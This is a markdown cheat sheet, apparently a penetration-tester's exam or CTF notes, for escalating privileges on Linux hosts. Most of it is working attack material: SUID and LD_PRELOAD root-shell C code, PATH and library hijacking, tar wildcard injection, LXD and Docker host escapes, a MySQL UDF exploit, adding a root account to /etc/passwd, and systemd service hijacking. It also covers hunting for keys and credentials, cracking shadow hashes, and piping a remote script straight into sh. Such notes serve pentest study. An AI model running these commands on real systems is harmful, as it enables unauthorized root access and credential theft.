---
title: Linux Privesc
published: 2026-06-07
updated: 2026-06-07
description: ""
image: ""
tags: []
category: ""
draft: false
---
### 0. FLAG ACQUISITION AND TRUNCATION
1. **The Standard:**
```bash
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

2. **The Speedster (Locate):**
```bash
locate local.txt proof.txt
```

3. **The Content Search (Grepping):**
```bash
grep -rnw '/' -e "flag{" 2>/dev/null
```

4. **TREE-ING:**
```bash
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
```

```bash
find . | awk -F/ '{print (NF>1 ? sprintf("%" (NF-2)*4 "s", "") "|-- " : "") $NF}'
```

```bash
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
```
#### Un-truncate Terminal Output
- **Linux:** `export COLUMNS=1000` or `stty cols 1000` (alternatively pipe to `less -S`)


## 1. Quick Triage (Run Immediately)

_Goal: Identify low-hanging fruit and immediate escalation vectors._

### System & Kernel Information

- [ ] **OS Release:** `cat /etc/issue; cat /etc/*-release`    
- [ ] **Kernel Version:** `uname -r; arch`
- [ ] **CPU Info:** `lscpu`
- [ ] **Environment Variables:** `env` (Check for high-privilege tokens or paths)
- [ ] **Kernel Exploits:** Compare `uname -r` `uname -a` against [Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

### User & Sudo Privileges

- [ ] **Current ID:** `id`
- [ ] **Sudo Capabilities:**
    - `sudo -l` (List allowed commands) - go for: [GTFOBins](https://gtfobins.org/)
    - `sudo -i` (Enter root shell if allowed)
    - `sudo -p` (Preserve Privileges)
    - **[Added]** Check for `LD_PRELOAD` in `sudo -l` output.
- [ ] **Sudo Version:** `sudo -V`
    - _Exploit:_ If version is **1.8.31**, use [this exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit).
- [ ] **Policy Kit:**
    - `dpkg -s policykit-1`
    - `pkexec --version`
    - _Exploit:_ [PKWNER](https://github.com/kimusan/pkwner)

### User Enumeration

- [ ] **Valid Shells:** `cat /etc/shells`
- [ ] **Shellshock Check:** `grep "*sh$" /etc/passwd`
- [ ] **View All Users:** `cat /etc/passwd`
    - Only usernames: `cat /etc/passwd | cut -f1 -d:`
- [ ] **Login History:** `lastlog`
- [ ] **Groups:** `cat /etc/group`
    - Interesting groups: `getent group sudo`
    - _Action:_ If user is in `adm` group, check `/var/logs` (or `/var/log`).
- [ ] **UID Conflicts:** Check id with `ls -ln`.
    - _Vector:_ If UID matches an NFS share owner, refer to **NFS** section.


---

## 2. File System & Binary Hunting

_Goal: Find misconfigured permissions, passwords, and capabilities._
### File Content Search (Recursive)

**Command:** `grep`
Search recursively (`-r`) starting from current directory (`.`), print line numbers (`-n`), and ignore case (`-i`).

```bash
grep -rni "search_term" .
```

| Flag | Description                                                             |
| ---- | ----------------------------------------------------------------------- |
| `-r` | Read all files under each directory, recursively.                       |
| `-n` | Prefix each line of output with the 1-based line number.                |
| `-i` | Ignore case distinctions (optional but recommended).                    |
| `-l` | Print only names of FILEs with selected lines (suppress normal output). |


### Finding important files:

**By Extension**

```Bash
find / -type f \( -name "*.pdf" -o -name "*.txt" -o -name "*.conf" -o -name "*.bak" \) 2>/dev/null
```

**By Content (Passwords/Keys)**

```Bash
grep -rnEi "password|pwd|cred" /home /etc /var/www /opt 2>/dev/null
```

### SUID/SGID & Capabilities

- [ ] **Find SUID Binaries:**
```Bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# IF ANY CUSTOM BINARY IS FOUND, CHECK IT WITH STRINGS.
```   
- _Note:_ Don't just look at GTFOBins. Search Google for the binary name + "exploit" or "privesc".    
- [ ] **Find SGID Binaries:**
```Bash
find / -perm /6000 -type f 2>/dev/null
```    
- [ ] **Capabilities:** (Check [[capabilities]])
```Bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Writable Files & Directories

- [ ] **Writable Directories:**
```Bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -writable -type d 2>/dev/null
```    
- [ ] **Writable Files:**
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```    

### Configuration & Password Hunting

- [ ] **Global Configs:**
    - `cat /etc/fstab` (Check for unmounted drives/credentials)
    - `cat /etc/iptables/rules.v4` (Listing 10 in linux privesc)
    - `cat .bashrc`
    - `cat /etc/logrotate.d` or similar (Check [logrotate.md](https://www.google.com/search?q=logrotate.md))

- [ ] **Find .conf Files:**
```Bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```    

- [ ] **Find Scripts:**
```Bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# WITH ls -la
find / -type f -name "*.sh" -not -path "*/src/*" -not -path "*/snap/*" -not -path "*/share/*" -exec ls -la {} + 2>/dev/null
```    

- [ ] **Hidden Files:** (Entire File System)
```Bash
find / -type d -name ".*" -ls 2>/dev/null
```

- [ ] **Hidden Directories:** (Entire File System) 
```bash
find / -type d -name ".*" 2>/dev/null
```

- [ ] **WordPress Config:**    
```Bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

- [ ] **Recursive Grep:**    
```Bash
grep -Horn <text> <dir>
# To print full line: exclude `-o`
```    

---

## 3. Process & Software Enumeration

_Goal: Analyze running code for vulnerabilities._

### Processes

- [ ] **List All Processes:**    
    - `ps aux`
    - `ps fauxww`
    - `ps -ewwo pid,user,cmd --forest`
- [ ] **Root Processes:** `ps aux | grep root`
- [ ] **Specific Process Search:** `ps u -C passwd` (View all processes called `passwd`)
- [ ] **Password Hunting in Process:** `watch -n 1 "ps -aux | grep pass"`
- [ ] **Process Snooping (No Sudo):** [pspy](https://github.com/DominicBreuker/pspy): `./pspy64 -pf -i 1000`
- [ ] **Doas Config:**
```Bash
find / -name doas.conf 2>/dev/null
```

- [ ] **Strace:** Use `strace` to trace system calls/signals of commands.   

### Cron Jobs & Timers

- [ ] **List Cron:**
    - `crontab -l` (Run with sudo if possible)
    - `ls -lah /etc/cron*`
- [ ] **Cron Logs:** `grep "CRON" /var/log/syslog`
- [ ] **[Added] Systemd Timers:** `systemctl list-timers --all`

### Packages & Tooling

- [ ] **Check Path:** `which nc`, `which python`, `which python3`, `which perl`, `which ruby`
- [ ] **Add Current Path:** `PATH=.:${PATH}`
- [ ] **List Packages:** `dpkg -l`
- [ ] **Check Binaries:** `ls -l /bin /usr/bin/ /usr/sbin/`
- [ ] **Kernel Modules:**
    - `lsmod`
    - Query module info: `/sbin/modinfo libata`
- [ ] **GTFOBins Auto-Check:**    
    1. Create list:
```Bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```       

	2. Compare against GTFO:    
```Bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

---

## 4. Network & Internal Services

_Goal: Pivot to internal services or find localhost-only listeners._

- [ ] **Connections & Listeners:** (**CHECK WITH BOTH `netstat` and `ss`**) 
    - `netstat -antup` (All)
    - `netstat -plunt` (Listening)
    - `ss -anp` 
    - `ss-tunlp`
- [ ] **Traffic Sniffing:** `sudo tcpdump -i lo -A | grep "pass"`
- [ ] **DNS & Hosts:**
    - `cat /etc/hosts`
    - `cat /etc/resolv.conf` (Internal DNS usually indicates AD)
- [ ] **Interfaces:** `ifconfig` or `ip a` (Check for dual homing)
- [ ] **Neighbors:** `arp -a`
- [ ] **Routing:** `route` or `routel`    

---

## 5. Specialized Vectors

_Goal: Exploit specific technologies found during enumeration._

### NFS Escalation

- [ ] **Discovery:** `showmount -e <ip>`    
- [ ] **Check Exports:** `cat /etc/exports`
    - _Condition:_ Look for `(rw,no_root_squash)`
- [ ] **Exploitation Steps:**
    1. Create `shell.c`:
```C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
	setuid(0);setgid(0);system("/bin/bash");
}
```

    2. Compile and mount:
```Bash
sudo mount -t nfs <target-ip>:/tmp /mnt
gcc shell.c -o shell
cp shell /mnt
chmod u+s /mnt/shell
```

    3. Execute on target: `./shell`

### Docker

**Identify:** 
- [ ] Check for `.dockerenv` in root.
- [ ] **Check for `.dockerenv`:** Run `ls -la /.dockerenv`.
- [ ] **Inspect Cgroups:** Run `grep 'docker' /proc/1/cgroup`.
- [ ] **Verify MAC Address:** Check `ip link` for the `02:42:ac` prefix.
- [ ] **Analyze PID 1:** Run `ps -p 1` (look for a non-systemd process).
- [ ] **Scan Mounts:** Run `mount | grep -i docker`.
- [ ] **Check Hardware:** Run `lspci` (usually empty in containers).

- [ ] **Hostname Check:** Docker hostnames are often random hex (e.g., `efaa6f5097ed`) unless `-h` was used.
- [ ] **Privileged Escalation:**
```Bash
sudo docker exec --privileged --user 0 -it container_name /bin/sh
```

- [ ] **Tooling:** Use [CDK](https://github.com/cdk-team/CDK) (Refer: Forgotten-vulnlab).

**Method 2:**
- [ ] Check for docker containers with: `docker image ls`
- [ ] Then, `docker run -v /:/mnt --rm -it <container_name> chroot /mnt /bin/sh`
**{WORKS BECAUSE DOCKER ALWAYS RUNS AS ROOT}**

### WSL (Windows Subsystem for Linux)

- [ ] **Mount C Drive:**    
```Bash
mount -t drvfs 'c:' /mnt/c
```

### Active Directory (Linux Integration)

- [ ] **Kerberos Config:** `cat /etc/krb5.conf`    
- [ ] **Root Access:** If root, use **KeyTabExtract**.
- [ ] **SSSD Secrets:**
```Bash
strings /var/lib/sss/secrets/secrets.ldb | grep '\$'
```
- [ ] **SSSD Cache:**

```Bash
strings /var/lib/sss/db/cache_cerberus.local.ldb | grep '\$'
```

### Disks & Peripherals

- [ ] **Block Devices:** `lsblk` (Hard disks, USB)
- [ ] **Partitions:** `fdisk -l` (Check unmounted drives)
- [ ] **Mounts:** `mount`
- [ ] **Printers:** `lpstat`

---

## 6. SSH & Cryptographic Keys

_Goal: Locate keys allowing lateral movement or root access._

- [ ] **Find Private Keys:**    

```Bash
find / -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" \) 2>/dev/null
```

- [ ] **Find Authorized Keys & Known Hosts:**

```Bash
find / -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
```

- [ ] **SSH Configuration:** Check `cat /etc/ssh/sshd_config` for `PermitRootLogin`.

---

## 7. Execution Path & Environment Hijacking

_Goal: Exploit relative paths or vulnerable library loading in SUID binaries._

### Path Hijacking

- [ ] **Identify Relative Calls:** Run `strings <SUID_binary>` or `ltrace ./<SUID_binary> 2>&1 | grep execve`. Look for commands called without an absolute path (e.g., `curl` instead of `/usr/bin/curl`).
- [ ] **Exploitation:**
    1. Create a malicious executable matching the called command name: `echo '/bin/bash -p' > /tmp/curl; chmod +x /tmp/curl`    
    2. Export the new path: `export PATH=/tmp:$PATH`    
    3. Execute the SUID binary.

### Library Hijacking

- [ ] **Shared Object Injection:** Run `strace -o strace.out ./<SUID_binary>; grep "No such file" strace.out`. Look for missing `.so` files in writable directories.   
- [ ] **RPATH Exploitation:** Run `objdump -x <SUID_binary> | grep RPATH`. If the RPATH directory is writable, place a malicious `.so` file there.

---

## 8. Wildcard Injections

_Goal: Exploit commands in cron jobs or scripts running with `*` as an argument._

- [ ] **Identify:** Look for commands like `tar *`, `chown *`, or `rsync *` running as root (often in cron).
- [ ] **Tar Exploit:**

```Bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
chmod +x shell.sh
# Wait for cron job to execute tar in this directory
```

---

## 9. Container & Group-Specific Escalations

_Goal: Leverage specific group memberships for full system compromise._

### LXD / LXC

- [ ] **Condition:** Current user is in the `lxd` group (`id`).    
- [ ] **Exploitation (Requires local Alpine image build or pulling a pre-built one):**

```Bash
# On attacking machine:
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder; ./build-alpine
# Transfer the resulting .tar.gz to target

# On target machine:
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# The host's root file system is now mounted at /mnt/root
```

### Screen / Tmux Session Hijacking

- [ ] **Condition:** Root has an active, detached screen or tmux session with lax permissions.
- [ ] **Exploitation:**
    - `screen -ls`
    - `screen -x root/<session_name>`        

---

## 10. Database Escalations (MySQL/MariaDB)

_Goal: Exploit database service running as root._

- [ ] **Condition:** MySQL is running as root (`ps aux | grep mysql`) and you have database credentials.
- [ ] **User Defined Functions (UDF) Exploit:**
    1. Locate `raptor_udf2.c` via searchsploit.
    2. Compile and transfer to the target.
    3. Execute in MySQL shell:        

```SQL
USE mysql;
CREATE TABLE foo(line blob);
INSERT INTO foo values(load_file('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

---

## 11. Automated Enumeration Tools

_Goal: Automate the discovery process efficiently during the exam._

- [ ] **LinPEAS:** (Transfer and run, check for RED/YELLOW output)    

```Bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

- [ ] **Linux Smart Enumeration (LSE):**

```Bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; chmod +x lse.sh; ./lse.sh -l 1
```

---

## 12. Sudo `LD_PRELOAD` Escalation

_Goal: Hijack execution flow when sudo preserves the LD_PRELOAD environment variable._

- [ ] **Condition:** `sudo -l` shows `env_keep+=LD_PRELOAD`.
- [ ] **Exploitation:**
    1. Create `preload.c`:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile: `gcc -fPIC -shared -o preload.so preload.c -nostartfiles`
3. Execute: `sudo LD_PRELOAD=/tmp/preload.so <any_allowed_sudo_command>`


---

## 13. Writable System Files (`/etc/passwd` & `/etc/shadow`)

_Goal: Manipulate user databases to inject a root account or steal password hashes._

- [ ] **Condition:** `/etc/passwd` is writable.
- [ ] **Exploitation:**
    1. Generate a password hash: `openssl passwd -1 -salt r00t password`
    2. Append new root user: `echo 'r00t:$1$r00t$xxxx:0:0:root:/root:/bin/bash' >> /etc/passwd`
    3. Switch user: `su r00t`
- [ ] **Condition:** `/etc/shadow` is readable.
- [ ] **Exploitation:**
    1. Copy `passwd` and `shadow` files to the attacker machine.
    2. Combine: `unshadow passwd shadow > unshadowed.txt`
    3. Crack: `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

---

## 14. Systemd Service Hijacking

_Goal: Execute arbitrary commands as root via misconfigured systemd service files._

- [ ] **Condition:** A `.service` file is writable by the current user, or the user has `sudo` rights to `systemctl` for a specific service.
- [ ] **Exploitation:**
    1. Modify the `ExecStart` directive in the service file (e.g., `/etc/systemd/system/test.service`):

```Ini, TOML
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
```

2. Reload daemon: `systemctl daemon-reload` (Requires privileges; skip if service restarts automatically or if rebooting).
3. Restart service: `systemctl restart test.service`
4. Execute: `/tmp/rootbash -p`


---

## 15. Capability Exploitation Specifics

_Goal: Exploit specific capabilities identified in Section 2._

- [ ] **Condition:** Binary has `+ep` capabilities (`getcap -r / 2>/dev/null`).
- [ ] **Exploitation Examples:**    
- **Python** (`cap_setuid+ep`):

```Bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- **Perl** (`cap_setuid+ep`):

```Bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

- **Tar** (`cap_dac_read_search+ep`):

```Bash
tar -cvf shadow.tar /etc/shadow
```

---

### PSPY Enumeration:

- [ ] Upload and use it first. Many boxes Can be solved just by this.
	- [ ] `timeout 5m ./pspy -i 1000`
	- [ ] `timeout 5m ./pspy64 -p -i 10 | grep -vE "(kworker|kthread|systemd|\[.*\])" | tee pspy_recon.log`
